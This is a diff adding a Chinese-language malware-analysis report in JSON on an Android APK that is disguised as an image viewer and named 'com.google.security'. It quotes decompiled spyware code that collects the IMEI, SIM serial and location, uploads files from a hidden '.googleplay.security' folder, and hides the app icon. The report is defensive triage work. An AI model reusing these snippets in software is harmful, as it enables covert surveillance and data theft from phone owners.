@@ -1,0 +1,140 @@
+{
+  "APK信息": {
+    "文件名": "230ddf07a868ccae369b891bc94a10efd928ff9c0c2fb2e44451e32167d2c2b7.apk",
+    "sha256": "230ddf07a868ccae369b891bc94a10efd928ff9c0c2fb2e44451e32167d2c2b7",
+    "包名": "com.sqisland.android.swipe_image_viewer",
+    "应用名": "com.google.security",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 250.4
+  },
+  "行为列表": [
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\sqisland\\android\\swipe_image_viewer\\AudioRecord;",
+          "method_signature": "if(!root.exists()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "File root = new File(Environment.getExternalStorageDirectory(), \"/.googleplay.security/\");\nif (!root.exists()) { root.mkdirs(); }\nTelephonyManager info = (TelephonyManager) getApplicationContext().getSystemService(\"phone\");\ninfo.getDeviceId();\nString simSerial = info.getSimSerialNumber();\ninfo.getSimOperatorName();\ninfo.getSimCountryIso();\nthis.fileName = String.valueOf(simSerial) + \"_audio_\" + time;\ntempFile = File.createTempFile(this.fileName, \".3gp\", root);",
+          "malicious_code_snippet_context": "                  externalStorageAvailable = false;\n              }\n              if (externalStorageAvailable && externalStorageWriteable) {\n>>>                 File root = new File(Environment.getExternalStorageDirectory(), \"/.googleplay.security/\");\n>>>                 try {\n>>>                     if (!root.exists()) {\n>>>                         root.mkdirs();\n>>>                     }\n>>>                     TelephonyManager info = (TelephonyManager) getApplicationContext().getSystemService(\"phone\");\n>>>                     info.getDeviceId();\n>>>                     String simSerial = info.getSimSerialNumber();\n>>>                     info.getSimOperatorName();\n                      info.getSimCountryIso();\n                      Calendar cal = Calendar.getInstance();\n                      int hr = cal.get(10);",
+          "behavior_description": "代码在伪装为Google Play安全组件的隐藏目录/.googleplay.security/下，通过TelephonyManager采集设备唯一标识符(IMEI/MEID)、SIM卡序列号、运营商名称和国家代码等隐私信息，将这些设备指纹数据拼接为文件名写入外部存储临时文件，为后续数据外传做准备。伪装目录名和隐蔽采集多个设备标识符的行为具有明确的恶意意图。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION",
+          "android.permission.ACCESS_COARSE_LOCATION"
+        ],
+        "字符串": [
+          "getLastKnownLocation",
+          "LocationManager"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\sqisland\\android\\swipe_image_viewer\\AudioRecord;",
+          "method_signature": "if(this.locationManager != null)",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "this.locationManager = (LocationManager) getApplicationContext().getSystemService(\"location\");\nthis.isGPSEnabled = this.locationManager.isProviderEnabled(\"gps\");\nthis.isNetworkEnabled = this.locationManager.isProviderEnabled(\"network\");\nif (this.locationManager != null) {\n    this.location = this.locationManager.getLastKnownLocation(\"network\");\n}\nif (this.isGPSEnabled && this.location == null && this.locationManager != null) {\n    this.location = this.locationManager.getLastKnownLocation(\"gps\");\n}\nreturn this.location;",
+          "malicious_code_snippet_context": "  \n      public Location getLocation() {\n          try {\n>>>             this.locationManager = (LocationManager) getApplicationContext().getSystemService(\"location\");\n>>>             this.isGPSEnabled = this.locationManager.isProviderEnabled(\"gps\");\n>>>             this.isNetworkEnabled = this.locationManager.isProviderEnabled(\"network\");\n>>>             if (!this.isGPSEnabled && !this.isNetworkEnabled) {\n>>>                 Log.e(\"Error\", \"Error:: Gps and Network Disabled\");\n>>>             } else {\n>>>                 this.canGetLocation = true;\n>>>                 if (this.isNetworkEnabled) {\n>>>                     Log.d(\"Network\", \"Network\");\n>>>                     if (this.locationManager != null) {\n                          this.location = this.locationManager.getLastKnownLocation(\"network\");\n                      }\n                  }",
+          "behavior_description": "代码通过LocationManager获取系统位置服务，分别检查GPS和网络定位是否可用，然后调用getLastKnownLocation获取设备最后已知位置（优先网络定位，其次GPS定位），最终将位置数据返回给调用方。该类名为AudioRecord却位于swipe_image_viewer包中，存在命名伪装行为。在已确认的恶意样本中，此位置数据很可能被后续代码窃取并上传至C2服务器。数据流向：LocationManager.getLastKnownLocation() → 返回Location对象供调用方使用（潜在外传）",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "listFiles",
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\sqisland\\android\\swipe_image_viewer\\AudioRecord;",
+          "method_signature": "if(Is3Gconnected(getApplicationContext()",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String path = Environment.getExternalStorageDirectory().toString() + \"/.googleplay.security/\";\nFile f = new File(path);\nFile[] file = f.listFiles();\nif (file.length > 0) {\n    for (File file2 : file) {\n        new MyTask(\"image\").execute(file2);\n    }\n}",
+          "malicious_code_snippet_context": "              TelephonyManager info = (TelephonyManager) getApplicationContext().getSystemService(\"phone\");\n              this.simSerial = info.getSimSerialNumber();\n              getAllFilesOfDir(new File(\"/storage/extSdCard\"));\n>>>             String path = Environment.getExternalStorageDirectory() + \"/.googleplay.security/\";\n>>>             Calendar cal = Calendar.getInstance();\n>>>             int hr = cal.get(10);\n>>>             int min = cal.get(12);\n>>>             int sec = cal.get(13);\n>>>             String time = String.valueOf(hr) + \"_\" + min + \"_\" + sec;\n>>>             File CreateFile = new File(String.valueOf(path) + this.simSerial + \"_SdCard_\" + time + \".jpg\");\n>>>             if (!CreateFile.exists()) {\n                  CreateFile.createNewFile();\n              }\n              FileOutputStream fOut = new FileOutputStream(CreateFile);",
+          "behavior_description": "代码从伪装为'.googleplay.security/'的隐藏目录中读取文件列表，遍历每个文件并通过MyTask异步任务上传（伪装为'image'类型），实现录音文件的窃取与外传。该隐藏目录名刻意模仿Google Play安全组件以规避用户察觉，结合AudioRecord类上下文，这是典型的音频监控间谍软件行为：先录音存储到隐藏目录，再在3G网络连接时将录音文件批量上传至远程服务器。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\sqisland\\android\\swipe_image_viewer\\MainActivity;",
+          "method_signature": "HydIcon()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "private void HydIcon() {\n    PackageManager p = getPackageManager();\n    p.setComponentEnabledSetting(getComponentName(), 2, 1);\n}",
+          "malicious_code_snippet_context": "          imgView.setImageDrawable(getResources().getDrawable(R.drawable.ic_launcher));\n      }\n  \n>>>     private void HydIcon() {\n>>>         PackageManager p = getPackageManager();\n>>>         p.setComponentEnabledSetting(getComponentName(), 2, 1);\n>>>     }\n  \n      /* loaded from: classes.dex */\n      private class ImagePagerAdapter extends PagerAdapter {",
+          "behavior_description": "该方法获取 PackageManager 后，调用 setComponentEnabledSetting 将当前组件（getComponentName() 返回的 MainActivity/启动组件）设为禁用状态（newState=2，COMPONENT_ENABLED_STATE_DISABLED），flags=1（DONT_KILL_APP），使应用启动器图标被隐藏，增加用户发现和卸载难度，属于恶意样本中的隐蔽/持久化行为。数据流向：getComponentName() → setComponentEnabledSetting() 禁用组件并隐藏图标。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
